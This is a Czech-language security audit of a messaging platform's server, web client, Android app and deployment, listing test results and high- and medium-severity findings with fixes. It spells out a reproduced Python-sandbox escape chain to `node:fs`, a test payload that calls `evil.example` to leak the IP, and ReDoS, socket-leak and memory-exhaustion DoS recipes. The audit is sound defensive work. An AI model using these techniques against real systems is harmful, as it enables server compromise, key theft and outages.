# Audit 6.7 — komponenty, funkčnost, stabilita, bezpečnost

Stav ke commitu `594202f5` (6.7.0, scaffold), větev `android_application`.
Audit je **jen pro čtení**: žádný zdrojový soubor se neměnil, tento dokument je
jediná změna. Každé tvrzení má odkaz na soubor:řádek nebo na příkaz, který jsem
spustil; co jsem neověřil, je označené **„ověřit"**.

Rozsah: server (`server/`), webový klient (`client/src`), operátorská konzole
(`admin-ui/public`), aplikace Android (`android/`), platforma Funkcí (sandbox
QuickJS / Pyodide, vestavěné balíčky, builder), Moduly a skupiny, telefonie,
AI a řeč, NFC, nasazení (`deploy/nginx`, Dockerfile, CI).

Cesty Androidu (`security/…`, `ui/…`, `chat/…`) jsou relativní k
`android/app/src/main/java/cz/m5cet/app/`, není-li uvedeno jinak.

## Shrnutí pro vedení

**Build a testy jsou zelené:** typy, 2026 unit testů, build, 329 testů Androidu i
všech 72 E2E testů (spuštěných z cesty bez tečkového adresáře) prošly. Jádro
kryptografie (obálky, AAD, IV, KDF, WebAuthn, relace, trezor na Androidu) je
navržené a implementované správně a v kódu jsem v něm nenašel chybu, která by
prolomila důvěrnost zpráv vůči serveru. Admin API má role vynucené na serveru,
porovnání tokenů v konstantním čase a konzole nemá XSS plochu. Kritický nález
(vzdálený, bez oprávnění, plný průnik) jsem nenašel.

**Šest nálezů vysoké závažnosti** (podrobně v kap. 3):

1. **V1 — sandbox Funkcí pro Python neplatí:** dokumentovaný Node permission model se vůbec nespouští; Python kód se přes most Pyodide dostane k `node:fs` (reprodukováno) → kdo smí psát/importovat Python balíček, čte klíče serveru a může se stát vlastníkem.
2. **V2 — výstupy funkcí od peerů:** libovolný člen místnosti pošle zprávu s „výstupem funkce" typu `js`, který se u příjemců sám spustí (sandboxovaný iframe, ale se sítí ven a s voláním funkcí jménem oběti).
3. **V3 — únik slotů WS brány:** 20 vadných handshaků zablokuje IP do restartu, 5000 celý server (reprodukováno).
4. **V4 — `POST /api/settings` bez přihlášení:** neomezená mapa v paměti → OOM serveru z jedné IP za 1–2 h.
5. **V5 — Android padá na Androidu 10–12:** `minSdk 29`, ale nechráněná volání API 30/33 (lint + bytecode).
6. **V6 — Android pin klíče serveru:** kontroluje se jen řetězec `kid`, ne veřejný klíč — pin z buildu i z QR je bez účinku.

Dále 21 středních nálezů — hlavně dostupnost (ReDoS v hlavní smyčce, visící
upgrade sockety, neomezená paměť/disk, strop účtů), Android zámek a
notifikace (počítání pokusů o PIN, plaintext na zamčené obrazovce, neúplný
wipe) a integrita webového klienta (sender-key kolize, odesílatel souboru,
historie hosta). Jedna střední chyba (S6, `res.sendFile` v adresáři s tečkou)
vysvětluje, proč E2E testy v agentních worktree `.claude/worktrees/…` padají —
není to síť ani VPN.

**Doporučené pořadí oprav:** V1 (vypnout Python Funkce nebo spustit sandbox s
`--permission`), V2, V3, V4 (DoS jedním klientem), V5 (zvednout `minSdk` nebo
ošetřit volání + Android job v CI), V6, potom S1–S5 a S10–S12.

## 1. Výsledky testů, buildů a auditů závislostí

Spuštěno v čistém worktree (fast-forward na `594202f5`, `npm ci`, Node 24.21, npm 11.19,
JBR 21 pro Gradle 9.8 / AGP 9.4.1).

| Kontrola | Příkaz | Výsledek |
|---|---|---|
| Typy | `npx tsc --noEmit -p .` | ✅ exit 0 |
| Unit testy | `npx vitest run` | ✅ 167 souborů, **2026 prošlo**, 4 přeskočené, 0 selhalo (24 s) |
| Vlastní lint | `bash scripts/pre-commit-check.sh` (= `npm run check:menu`, jediný lint v CI) | ✅ všech 8 kontrol |
| Build | `npm run build` | ✅ exit 0; 1 varování esbuild `import.meta` v CJS (`server/functions/sandbox/pool.ts:23`, ošetřeno `typeof __filename`, neškodné); `dist/index.cjs` 4,5 MB, `dist/admin.cjs` 3,8 MB |
| E2E (Playwright) v worktree pod `.claude/worktrees/…` | `npm run test:e2e` | ❌ 53 z 72 selhalo — **příčina není síť ani VPN**, ale chyba v `server/static.ts` (nález S6): cesta instalace obsahuje adresář s tečkou a `res.sendFile` vrací 404 na každý asset |
| E2E ze stejného stromu mimo tečkový adresář | `git archive HEAD` → scratch, `npm run build`, `npx vitest run --config vitest.e2e.config.ts` | ✅ **13 souborů, 72/72 prošlo** (25 s) — včetně P2P testů, které jindy padají pod VPN |
| Android unit testy | `./gradlew :app:testDebugUnitTest` | ✅ 43 sad, **329 testů, 0 chyb** |
| Android build | `./gradlew :app:assembleDebug` | ✅ `app-debug.apk` 51,6 MB |
| Android lint | `./gradlew :app:lintDebug` | ❌ **30 chyb, 110 varování** — 17× `NewApi` (volání API 30/33 při `minSdk 29`, nález V5), 12× `RestrictedApi` (`account/Passkeys.java:54-76`), 1× `UnspecifiedRegisterReceiverFlag` (`nfc/UsbReader.java:96` — větev pro API < 33, kde flag neexistuje a receiver je implicitně exportovaný, viz N18) |
| `npm audit --omit=dev` | | ⚠️ 2 zranitelnosti: `ip-address ≤10.7.0` (high, přes `express-rate-limit@8.7.0`), `qs ≤6.15.3` (moderate, přes `express`/`body-parser`); obě `fix available` bez breaking change |
| `npm audit` (vč. dev) | | ⚠️ 7 (6 high, 1 moderate): navíc řetěz `tailwindcss@3.4.19 → chokidar/fast-glob/micromatch → braces` (ReDoS/stack exhaustion při buildu; oprava jen přes tailwind 4 = major) |
| Gradle závislosti | `app/build.gradle.kts:83-94` | ℹ️ firebase-messaging 25.1.3, webrtc-sdk 150.7871.01, recyclerview 1.4.0, credentials 1.6.0 — známé CVE jsem offline nedohledal (**ověřit** např. OWASP dependency-check); verification-metadata/lock Gradle nepoužívá |

Dopad nálezů z `npm audit` na tento kód:

- `qs` — **nedosažitelné**: `express.urlencoded({ extended: false })` (`server/index.ts:149`) a Express 5 má výchozí „simple" query parser; `qs` se na vstup nepoužije.
- `ip-address` — používá ho `express-rate-limit` pro klíč IPv6 podsítě. Adresy pocházejí z `req.ip` (socket nebo `X-Forwarded-For` jen od důvěryhodné proxy, `server/trust-proxy.ts`), takže zneužitelnost je nízká; přesto `npm audit fix` (nebreaking).
- CI (`.github/workflows/ci.yml`) **nespouští** Android build, testy ani lint, ani `npm audit` — proto chyby `NewApi` (V5) prošly.

## 2. Komponenty — stav a důkazy

✅ v pořádku · ⚠️ funguje, ale s nálezem střední/nízké závažnosti · ❌ nález vysoké závažnosti

### Server

| Komponenta | Stav | Důkaz (co je v pořádku / odkaz na nález) |
|---|---|---|
| Signalizace — rámce, parsování, podvržení id | ✅ | přesné tvary s limity (`server/signaling/frames.ts:143-271`), `maxPayload` 256 kB, `perMessageDeflate:false` (`hub.ts:168`), `source` signálu doplňuje server (`hub.ts:695`), resume tajemství `timingSafeEqual` (`hub.ts:566,576`) |
| Signalizace — upgrade, brána, limity | ❌ | brána existuje (`hub.ts:266`, mezera č. 1 opravena), ale uniká (V3); cizí cesty visí (S3); per-socket token buckety a heartbeat OK (`limits.ts:18-28`, `hub.ts:397-431`) |
| Místnosti, `peerId`, `maxMembers` | ⚠️ | N3, N4 |
| Relay fronta (away) | ⚠️ | kvóty položek/bajtů OK (`accounts/mailqueue.ts:66-80`), ack/release podle účtu (`:333,350`); S5, N1 |
| Účty a passkeys (WebAuthn, CBOR) | ✅ | challenge náhodná, jednorázová, vázaná na účel, TTL 2 min (`accounts/routes.ts:79-97`); origin, type, crossOrigin, rpIdHash, UP+UV (`webauthn.ts:97-102,196-198,228-230`); allowlist ES256/EdDSA/RS256≥2048 (`:20-21,138-162`); regrese čítače odmítnuta (`:235-237`); CBOR hloubka 16, 4096 položek (`cbor.ts:9-43`) |
| Relace, tokeny, recovery | ✅ | 32 B náhody, uložené jen SHA-256, 12 h klouzavě / max 7 dní, 20 na účet (`accounts/store.ts:562-603`), odvolání dosáhne i otevřených socketů (`hub.ts:761-776`); recovery v konstantním čase (`store.ts:522-528,746-756`), 10/h/IP |
| Kapacita účtů, `accounts.json` | ⚠️ | S8, N2 |
| Úložiště (SQL, kvóty, IDOR) | ⚠️ | vše parametrizované (`storage/user-store.ts:381-389`, `global-store.ts:481,546,767`), id databáze nikdy od volajícího (`storage/api.ts:102-116`), kvóta v transakci (`user-store.ts:160-164`); S7 |
| Push | ✅ | SSRF allowlist endpointů při odběru i odeslání (`server/push.ts:47-62,75`, `push-routes.ts:55`), broadcast jen admin (`push-routes.ts:81-84`), budicí payload neutrální (`signaling/relay.ts:398-405`) |
| Soubory / file-proxy relay | ⚠️ | mezera č. 5 opravena — přeposílá a těla neukládá (`file-proxy.ts:94-104`); N5 |
| Hlavičky, CSP, chybové odpovědi | ✅ | produkční `script-src 'self' 'wasm-unsafe-eval'` (`server/index.ts:173`), `frame-ancestors 'none'`, `object-src 'none'`; 5xx generické (`index.ts:225-240`); žádné cookies, žádné CORS |
| Statické soubory | ⚠️ | S6 (dot-adresář → 404) |
| Rate limity a parsery | ⚠️ | S4, N10; `express-rate-limit` 8 seskupuje IPv6 do /56 |
| Nastavení zařízení, audit z klienta | ❌ | V4, S9 |
| Cluster (Redis RESP) | ⚠️ | parser omezený, chyba protokolu odpojí (`cluster/resp.ts:39-82,142`); N8 |
| Zálohy | ✅ | žádné cesty od uživatele, master klíč vynechán, adresáře 0700 (`storage/backup.ts:103-133`); restore endpoint neexistuje |
| Metriky, monitor, alerty | ⚠️ | ringy omezené (`monitor/traffic.ts:164`, `monitor/audit.ts:100`); N10 |
| Stabilita procesu | ⚠️ | graceful shutdown (`index.ts:279-301`), časovače `unref`; N7, I5 |
| Admin API a konzole — autentizace, role | ✅ | tokeny jen jako SHA-256, `timingSafeEqual` (`admin-auth.ts:40-43`, `admin-users.ts:109`), role owner/operator/auditor vynucené na serveru (`admin-auth.ts:50-72`), správa adminů jen owner (`admin-api.ts:157-193`), limiter odmítnutých 30/15 min (`index.ts:133`, `admin.ts:190`); tokeny funkcí (`m5f1`) HMAC, TTL ≤ 15 min, oblast + role vynucená po cestách (`functions/adm-token.ts:73-116`) |
| Admin konzole — XSS | ✅ | DOM/`textContent`, jediné `innerHTML` v `admin-ui/public/legacy-tools.js:41-80` vše přes `esc()`; CSP konzole `script-src 'self'`, `frame-ancestors 'none'` (`server/admin.ts:168`) |
| Audit journal | ⚠️ | hash chain + podepsané checkpointy (`admin-api.ts:693-706`), komunikační audit vypnutý ve výchozím stavu (`monitor/audit.ts:21-24`); S9 |
| Funkce — sandbox a izolace | ❌ | V1; QuickJS (JS) bez nálezu, jeden běh = jeden proces, watchdog SIGKILL (`functions/sandbox/pool.ts:198-216`), pád dítěte nespadne hlavní proces (`sandbox/child.ts:175-185`) |
| Funkce — host volání | ⚠️ | S1, S2, N14–N16; SSRF guard: resolve → pin adresy, re-check přesměrování, jen http(s) (`functions/host-net.ts:57-136`), N13 |
| Funkce — authz, webhooky, úložiště | ✅ | role + práva konzole (`functions/admin-routes.ts:163-238`), webhook tokeny 144–192 bitů porovnané v konstantním čase, volitelné HMAC těla (`functions/routes.ts:375-379`), SQL parametrizované (`functions/store.ts:312-340`), vstupy jen deklarovaná jména (`inputs.ts:105-116`), `..` v balíčcích odmítnuto (`packages.ts:76`) |
| Funkce — výstup HTML (`m5.out.html`) | ✅ | server sanitizuje allowlistem už při kontrole výstupu (`client/src/lib/fn-outputs.ts:297-301` → `fn-html.ts`), klient znovu; JS jen v opaque iframe (`sandbox-page.ts`) — ale viz V2 (výstupy od peerů) |
| Vestavěné balíčky, flow builder | ✅ | flow generuje volání jen ze seznamu `m5adm` (`functions/flow.ts:156,778-790`); balíčky jen publikované verze téhož jazyka (`packages.ts:71-110`) |
| Moduly a skupiny | ✅ | přepínače za `switchRefused` (`modules-routes.ts:26-33`), owner vždy (logováno, `access.ts:89`), rozhodnutí logována (`access.ts:90-95`) |
| Telefonie | ⚠️ | Twilio HMAC-SHA1, Telnyx Ed25519 s oknem 300 s, Vonage HS256 — vše `timingSafeEqual` (`telephony/webhooks.ts:115-170`); odchozí jen s právem a číselnými pravidly (`telephony/routes.ts:54-56`); N11, I2 |
| AI a řeč | ✅ | limiter (`ai/routes.ts:32-38`), limity velikosti (`:28-30`), obsah jen s opt-in logováním (`ai/journal.ts:1-10`); I1 |
| NFC (server) | ✅ | běhy osob potřebují vlastní práva, neinteraktivní grant modelu (`functions/host-nfc.ts:48-60`), klíče/PINy odstraněny (`sanitizeNfc*`) |
| Android server — bundly, APK, zařízení | ⚠️ | ECDSA P-256 podpis hlavičky vč. hashů ciphertextu i plaintextu, AES-GCM segmenty s AAD indexu (`server/android/crypto.ts:177-245`); podepsané požadavky zařízení s nonce a časem (`android/routes.ts:63-82`); N12, I4 |

### Webový klient

| Komponenta | Stav | Důkaz |
|---|---|---|
| Krypto — IV, náhoda, KDF, extractable | ✅ | IV 96 b z `getRandomValues` (`client/src/lib/crypto.ts:101`, `envelope.ts:184`, `sender-keys.ts:216,275,299`), odvozené klíče `extractable:false` (`crypto.ts:86`, `envelope.ts:117,125`), Argon2id 64 MiB/3, PBKDF2 600k (`kdf.ts:17-18`), recovery kód 130 b (`recovery.ts:22-24`); `Math.random` jen EMV UN (`nfc/cards/emv.ts:58`) |
| Obálka, AAD, replay | ✅ | AAD váže místnost + id (`envelope.ts:205-223`), signály from/to (`:238`), chunky transferId/seq/total (`:266-268`), nezapečetěné signály odmítnuty (`App.tsx:2628-2633`); N32 |
| Sender keys, pairwise | ⚠️ | S18 |
| TOFU, otisky | ⚠️ | N23, N27, mezery č. 6 a 7 trvají |
| Úložiště v klidu | ⚠️ | session cache neexportovatelný klíč + AAD (`session-cache.ts:168-173`), klíč DB zabalený (`storage-client.ts:83-90`); S17, N24, N28 |
| Sdílecí odkazy | ✅ | tajemství ve fragmentu `#` (`share-link.ts:65`), po příchodu vymazáno z adresy (`App.tsx:4681-4684`), kód povinný |
| Service worker | ⚠️ | žádný fetch handler, žádná cache, pole push omezena (`client/public/sw.js:49-55`); N22 |
| XSS (markdown, odkazy, layout, menu) | ✅ | v `client/src` žádné `dangerouslySetInnerHTML`/`innerHTML`/`eval`/`new Function`/`srcdoc`; markdown jen http(s)/mailto (`markdown.ts:29-34`), linkify totéž (`linkify.tsx:5`), URL layoutu kontrolované (`LayoutView.tsx:423`); payloady `jav&#x61;script:`, `onerror`, SVG/foreignObject, meta refresh, `url()` sanitizer odstraní |
| Výstupy funkcí od peerů | ❌ | V2 |
| Soubory | ⚠️ | MIME allowlist + přeznačení (`validate.ts:31-36,56-80`), `safeFileName`, digest a podpis na konci (`file-transfer.ts:826-831`); S19, S20 |
| Odkazy, postMessage | ✅ | `_blank` vždy s `noopener`; `FnSandbox` kontroluje `e.source` (`FnSandbox.tsx:44`), `layout-preview` origin i source (`layout-preview.tsx:362`) |
| Stabilita | ⚠️ | reconnect s full-jitter backoffem do 120 s (`App.tsx:2699-2719`, `room-hub.ts:155-160`), worker médií ukončen (`media-e2ee.ts:109`); S20, N30 |

### Android aplikace

| Komponenta | Stav | Důkaz |
|---|---|---|
| Manifest, exportované komponenty, záloha | ✅ | `allowBackup=false`, `data_extraction_rules.xml` vylučuje vše; exportované jen launcher/`m5cet://enroll`/SEND, Authenticator/SyncService (operace nepodporované), CardService za `BIND_NFC_SERVICE` + `requireDeviceUnlock`; lint `ExportedService` (Authenticator/Sync) je u tohoto vzoru očekávaný |
| Deep linky a intenty | ✅ | enrol odkaz jen vyplní formulář (`ui/parts/Forms.java:90-98`), kontaktní řádky kontrolují MIME a typ účtu (`contacts/AddressBook.java:161-163`) |
| Síť, TLS | ✅ | release: bez cleartextu, jen systémové CA; žádný vlastní TrustManager/HostnameVerifier; WebSocket kontroluje hostname (`net/WebSocket.java:80`); bez přesměrování (`net/Server.java:70`); debug věří uživatelským CA (N18) |
| Pin serveru při enrolmentu | ❌ | V6 |
| Keystore, trezor, soubory | ✅ | AES-GCM systémový klíč, HMAC pepper, StrongBox napřed, biometrický klíč `BIOMETRIC_STRONG` zneplatněný novým otiskem (`security/Keystore.java:57-96`); náhodné IV + AAD `tier|name` (`security/Vault.java:200-207`); soubory nonce‖index s AAD (`security/FileVault.java:50-56`); žádné SharedPreferences |
| Zámek, PIN, biometrie, wipe | ⚠️ | PIN PBKDF2 210k + Keystore pepper, ověření GCM tagem (`security/Vault.java:97-139`), biometrie s CryptoObject (`security/Biometric.java:44`); S10, S11, S12, N18 |
| FLAG_SECURE | ⚠️ | výchozí zapnuto (`ui/MainActivity.java:154-157`); dialogy bez něj (N18) |
| WebView (HTML výstup funkcí) | ✅ | JS vypnutý, souborový/obsahový přístup vypnutý, síť blokovaná, CSP, allowlist sanitizer, jen https odkazy na klepnutí (`fn/FnHtmlView.java:168-201,246-262`) |
| FCM / řídicí zprávy | ✅ | jen data; ECDSA připnutým klíčem přes `deviceId|id|e|iv|ct`, ECIES, vazba id, deduplikace, expirace (`push/Control.java:45-59`) |
| Bundly a aktualizace APK | ⚠️ | podpis pokrývá hashe, AEAD po segmentech, `..` blokováno, limity, zkušební běh a rollback (`update/BundleFile.java`, `update/Bundles.java:221-246`); APK: podepsaná metadata, balíček, stejný certifikát, hash (`update/Releases.java:88-105`); N18 (downgrade, tiché instalace), dědí V6 |
| Expr / akce design bundlů | ⚠️ | bez reflexe, hloubka 40, délka 400, akce jen z uživatelských událostí; S14 |
| NFC | ⚠️ | parsery většinou omezené, výjimky chycené (`ui/parts/NfcWorkbench.java:256`, `nfc/Nfc.java:133`); ECB jen tam, kde to protokol (BAC/PACE MAC) vyžaduje; N18 |
| Chat krypto | ⚠️ | `SecureRandom` všude, MAC/hashe `MessageDigest.isEqual` (`security/Crypto.java:136`, `nfc/AesSm.java:163`, `nfc/PaceProtocol.java:401`), přeskočené sender-keys max 1000; S15 |
| Kompatibilita / lint | ❌ | V5, N20 |
| Životní cyklus | ⚠️ | S13, N18 (`CallService`, WebSocket timeout); lint `StaticFieldLeak` `ui/media/AudioBar.java:28`, `VideoBox.java:29` |

### Nasazení

| Komponenta | Stav | Důkaz |
|---|---|---|
| Referenční nginx | ⚠️ | WS `limit_req`/`limit_conn` (`deploy/nginx/m5cet.conf:36-37,166-167`), plná CSP na statice; S16 |
| Docker / instalátor | ✅ | instalátor generuje `ADMIN_API_TOKEN` 32 B (`installer/lib/deploy.sh:98`, `core.sh:93`); Docker build spouští `npm run check` (`Dockerfile:6`) |
| CI | ⚠️ | typy, unit, build, instalátor, E2E; chybí Android a `npm audit` (N20) |

## 3. Nálezy podle závažnosti

Závažnost: **kritická** (vzdáleně a bez oprávnění, plný průnik) · **vysoká** ·
**střední** · **nízká** · **info**. „Potvrzeno" = cesta v kódu prošlá celá,
u označených i reprodukovaná skriptem (skripty jsou ve scratchpadu auditu, ne v repu).
Kritický nález jsem nenašel.

### Vysoká

**V1 — Python v sandboxu Funkcí se dostane k souborům hostitele (chybí deklarovaná „první zeď")** — potvrzeno, reprodukováno
- Kde: `server/functions/sandbox/pool.ts:105-106` spouští dítě jen s `--max-old-space-size`; komentáře `server/functions/sandbox/child.ts:4` a `harden.ts:4-8` (i `docs/functions-architecture.md:151`) tvrdí `node --permission --allow-fs-read=… --disallow-code-generation-from-strings` a bubblewrap — v kódu nic z toho není (grep `--permission|allow-fs|bwrap` v `server/`, `script/`: jen komentáře). `harden.ts` nestubuje `node:fs` (spoléhá na permission model). `prelude-py.ts:8-11` sám říká, že blokace `import js` je „courtesy, not the wall".
- Reprodukce (Python model přes `runAdhoc`, stejná cesta jako konzole): z libovolné funkce SDK `m5.*` → `__globals__["_h"]` (JsProxy modulu `_m5host`) → `.constructor.constructor` = JS `Function` → `Function("return import('node:fs')")()` → `fs.readFileSync(<soubor hostitele>)` vrátil obsah souboru. Výstup: `{"host_bridge":"<class 'pyodide.ffi.JsProxy'>","eval_1_plus_1":2,"fs_read":"HOST-FILE-CONTENT"}`.
- Dopad: kdo smí v konzoli psát nebo importovat (`.m5pkg`) Python balíček, nebo spustit koncept v konzoli, čte a zapisuje soubory pod účtem serveru: `storage.key` (master klíč úložiště), `functions-adm.key` (→ vlastní podepsané `m5f1` tokeny s rolí owner a všemi oblastmi, `adm-token.ts:35-70`), podpisový klíč Android bundlů, `admin-users.json`, `.env`; zápisem i trvalé spuštění kódu (např. přepsání `dist/`). Je to eskalace z „operátora s modulem Funkce" na vlastníka a na dešifrování serverových dat; importovaný cizí balíček = kompromitace serveru.
- Oprava: (1) skutečně spouštět dítě s `--permission --allow-fs-read=<sandbox.cjs, adresář pyodide, quickjs .wasm>` (zápis nepovolit) a ověřit kompatibilitu s Pyodide / `--disallow-code-generation-from-strings` (WASM kompilace); (2) na Linuxu bubblewrap/nsjail bez sítě a s prázdným FS, jak dokumentace slibuje; (3) v `harden.ts` odstavit i `Function`/`AsyncFunction` konstruktor a `import()` dostupné přes prototypy, `node:fs` stubovat pro Python běh; (4) regresní test s výše uvedenou sondou; (5) dokud to neplatí, opravit komentáře a dokumentaci, ať netvrdí neexistující ochranu, a import cizích Python balíčků považovat za spuštění kódu na serveru.

**V2 — Kterýkoli člen místnosti podvrhne „výstupy funkce", které se příjemcům samy spustí** — potvrzeno (klient), dopad na serverové handlery ověřit
- Kde: `client/src/lib/validate.ts:108` ponechá z payloadu **od peera** `flags.fn.outputs` (jen strukturální `sanitizeFnOutputs`) i `fn.model`/`fn.chain` (`:104-105`); `client/src/lib/fn-outputs.ts:289-295` přijme `type: "js"` (až 200 000 znaků kódu); `client/src/components/MessageBubble.tsx:353-355` vykreslí výstupy u zprávy kohokoli; `client/src/components/fn/FnOutputs.tsx:193-200` kód spustí — viditelný vždy, skrytý (`hidden`), je-li zpráva „čerstvá" podle `createdAt`, které určuje odesílatel.
- Sandbox je iframe s opaque originem (`FnSandbox.tsx:71`, `sandbox="allow-scripts"`), ale jeho CSP povoluje `connect-src https:` a `img-src … https:` (`server/functions/sandbox-page.ts:20,23`); most `send`/`submit` volá `host.event` → `POST /api/functions/event` s **Bearer tokenem příjemce** pro model a chain zvolené útočníkem. Server ověří jen, že model je volajícímu přístupný a chain k modelu patří (`server/functions/routes.ts:224-228`), ne že volající do konverzace patří.
- Dopad bez jakékoli interakce: cizí JS v prohlížeči každého příjemce (i přes relay/away doručení), únik IP a User-Agentu na libovolný https server, až 200 událostí do funkcí jménem oběti, podvržené `flash` hlášky aplikace, autoplay/loop audio, formuláře, které vypadají jako aplikace.
- Test (agent webu, `scratchpad/web/xss.mts`): `validatePayload` ponechal `{"type":"js","code":"fetch('https://evil.example/?ip')","hidden":true}` s `chain:"chn_abcdef"`, `flash` i audio s `autoplay`/`loop`.
- Oprava: u payloadů od peerů zahodit výstupy `js`, `window`, `flash`, `form`, `button`, příznak `autoplay` a `fn.chain` — přijímat je jen z lokálně spuštěného běhu nebo z výsledku podepsaného serverem; kód od peera spouštět až po kliknutí; na serveru vázat chain na místnost/volajícího a autorizovat každou událost; zúžit `connect-src`/`img-src` sandboxu.

**V3 — Únik slotů WS brány: 20 vadných handshaků zablokuje IP, 5000 celý server** — potvrzeno, reprodukováno dvakrát
- Kde: `server/signaling/hub.ts:266` `this.gate.admit(ip)` → `:271` `this.wss.handleUpgrade(…, (ws) => this.connected(…))`; slot vrací jen `closed()` (`:384`). Knihovna `ws` při vadném `Sec-WebSocket-Key`/verzi/metodě handshake ukončí bez callbacku → slot se nikdy nevrátí.
- Reprodukce (`scratchpad/core/gate-leak.ts`): 20× upgrade s `Sec-WebSocket-Key: x` → `400`, `gate stats: {"total":20,"clients":1}`, následný legitimní WebSocket → **HTTP 429**. Do restartu.
- Dopad: odepření služby pro jednu adresu (u CGNAT celé sítě), při 5000 slotech `server-full` (503) pro všechny. Brána klíčuje plnou IPv6 adresu (`hub.ts:114-129`), takže /64 to zvládne během sekund.
- Oprava: před `handleUpgrade` `socket.once("close", …)` s uvolněním, pokud callback nepřišel (nebo validovat hlavičky před `admit`); IPv6 klíčovat po /64.

**V4 — `POST /api/settings` bez přihlášení drží libovolný JSON v paměti bez limitu počtu** — potvrzeno (kód), změřeno synteticky
- Kde: `server/routes.ts:380-387` `deviceSettings.set(deviceId, { deviceId, payload, … })`, mapa `server/device-state.ts:19` se čistí jen podle stáří (30 dní, `server/retention.ts:109-111`).
- Měření (`scratchpad/core/settings-heap.mjs`, model stejné operace): 256 kB JSON z `{}` = ~5,6 MB haldy na požadavek; při limitu `/api` 100 req/15 min/IP ≈ 0,56 GB za 15 min z jedné IP → OOM za 1–2 h, pád smaže veškerý stav v paměti. Navíc kdokoli zná-li `deviceId` čte (`GET /api/settings?deviceId=`) i přepisuje cizí nastavení.
- Oprava: limit velikosti (např. 16 kB, ukládat jako řetězec), LRU ~10k záznamů, vázat zápis/čtení na doklad zařízení; stejné limity pro `deviceAuditLog`, `consentLedger`, `pushSubscriptions`.

**V5 — Android: `minSdk 29`, ale nechráněná volání API 30 a 33 → pád na Androidu 10–12** — potvrzeno (lint + bytecode)
- Kde: `android/app/build.gradle.kts:29` `minSdk = 29`; `ui/MainActivity.java:71` `getWindow().setDecorFitsSystemWindows(false)` (API 30) přímo v `onCreate`, `:78-81` `WindowInsets.Type`/`CONSUMED` (30), `:399-402` `getWindowInsetsController` (30); `InputStream.readAllBytes()` (API 33) v `design/Appearance.java:57`, `security/FileVault.java:213`, `ui/Renderer.java:969`, `ui/parts/Composer.java:536,576`; `update/InstallReceiver.java:20` `getParcelableExtra(String, Class)` (33); `telecom/Notify.java:122` `pushDynamicShortcut` (30); `location/Where.java:75` `getCurrentLocation` (30).
- Důkaz: `./gradlew :app:lintDebug` → 17× `NewApi`; `dexdump` z `app-debug.apk` ukazuje přímé `invoke-virtual Ljava/io/InputStream;.readAllBytes` a `Landroid/view/Window;.setDecorFitsSystemWindows` (D8 je nebackportuje). `NoSuchMethodError` je `Error`, okolní `catch (Exception)` (např. `Appearance.java:58`) ho nechytí.
- Dopad: Android 10 spadne hned při startu, Android 11–12 při čtení šablon/souborů z trezoru/instalaci aktualizace. Na Fold6 (API 34+) se to neprojeví.
- Oprava: buď `minSdk = 33` (a říct to), nebo obalit voláními `Build.VERSION.SDK_INT >= …` a nahradit `readAllBytes` vlastní smyčkou; zapnout `lint { abortOnError = true }` a Android job v CI.

**V6 — Android: pin klíče serveru při zápisu (enrolment) neváže veřejný klíč** — potvrzeno
- Kde: `ui/parts/Forms.java:203-208` porovná jen řetězec `kid` z odpovědi serveru (`/info`) s `BuildConfig.SERVER_KEY_PIN` / kid z QR; `core/Config.java:81-82` pak uloží `server.publicKey` bez kontroly, že `kid == Ec.kid(publicKey)`.
- Dopad: build-time pin i kid v QR kódu jsou bez účinku — podvržený server (podobná doména, podvržený QR) stačí, když vrátí očekávaný `kid` a vlastní klíč. Ten se stane kotvou důvěry pro vzdálené smazání/zamčení, push, design bundly (celé UI) a metadata vydání APK.
- Oprava: před `config.enrolled()` ověřit `Ec.kid(answer.server.publicKey)` == pin == `info.kid` a klíč validovat (`Ec.publicFromSpki`).

### Střední

**S1 — ReDoS ve filtrech `m5adm` blokuje hlavní smyčku služby** — potvrzeno, reprodukováno
- Kde: `server/functions/host-adm.ts:114` heuristika `/\([^)]*[+*}][^)]*\)\s*[+*{]/` proti vnořeným kvantifikátorům; `:117` test na prvních 200 znacích. Běží v hlavním procesu (`runner.ts:350` → `hostAdm`), ne v sandboxu.
- Reprodukce (`scratchpad/me/redos.mjs`): `((a+))+$` a `(a|a)+$` heuristikou projdou; na 28 znacích trvá test 8,4 s resp. 14 s, na povolených 200 znacích prakticky nekonečně. Filtr může podle komentáře (`:104-107`) pocházet ze vstupu volajícího.
- Dopad: jeden běh modelu s oprávněním do administrace zastaví celý chat (signalizace, API).
- Oprava: nepouštět uživatelské regexy v hlavním vlákně — RE2 (`re2`/`node-re2`) nebo vyhodnocení v sandboxu / worker threadu s timeoutem; případně jen literály/glob.

**S2 — `m5.crypto.jwt.verify` je náchylné k záměně algoritmu (RS/ES → HS)** — potvrzeno (kód)
- Kde: `server/functions/host-crypto.ts:49-58` bere `alg` z hlavičky tokenu; pin jen pokud volající dá `opts.alg`. Při `alg: HS256` se jako HMAC tajemství použije PEM veřejného klíče (`asText(keyOrSecret)`).
- Dopad: model ověřující RS256 tokeny bez `opts.alg` přijme padělek podepsaný veřejným klíčem.
- Oprava: odvodit rodinu algoritmu z typu klíče (PEM/KeyObject ⇒ nikdy HS*), `opts.alg` povinné nebo výchozí podle klíče; test na alg confusion.

**S3 — Upgrade požadavky na jinou cestu než `/ws` zůstanou viset otevřené** — potvrzeno, reprodukováno
- Kde: `server/signaling/hub.ts:253` `if (pathname !== this.path) return;`, `server/telephony/bridge.ts:517` `if (!m || !wss) return;` — nikdo socket nezavře, brána je mimo hru.
- Reprodukce (`scratchpad/core/upgrade-hang.ts`): 100× `GET /not-ws` s Upgrade → po 8 s všech 100 spojení otevřených, `gate total 0`.
- Dopad: vyčerpání deskriptorů při přímém vystavení (výchozí `HOST=0.0.0.0`, kontejnery); za nginx zmírňuje `proxy_read_timeout`.
- Oprava: jeden dispatcher `upgrade`, který neznámé cesty ukončí `400/404` a `socket.destroy()`.

**S4 — Velké JSON parsery před autentizací; prefix `m5f1.` vypne limity administrace** — potvrzeno (kód)
- Kde: `server/index.ts:116` `express.json({ limit: "8mb" })` pro `/api/admin/android/design` (a `:120` 1 MB menu) je před limitery `/api/admin` (`:131-136`), hlavní limiter `/api/admin` přeskakuje (`:57`); `:133-134` přeskočí oba limitery, když bearer **začíná** `m5f1.` (`adm-token.ts:89` jen `startsWith`), a `:135` klíčuje bucket podle neověřeného `m` z payloadu.
- Dopad: neomezené 8MB parsování bez tokenu (CPU/paměť); `Bearer m5f1.<cokoli>` s rotací jména modelu obejde veškeré omezení `/api/admin` (hádání tokenů tím ale neprojde — HMAC); lze vyčerpat bucket skutečné funkce.
- Oprava: `requireAdminToken` před velkými parsery; ve `skip`/`keyGenerator` volat `verifyAdmToken`; snížit `httpServer.requestTimeout`/`headersTimeout`.

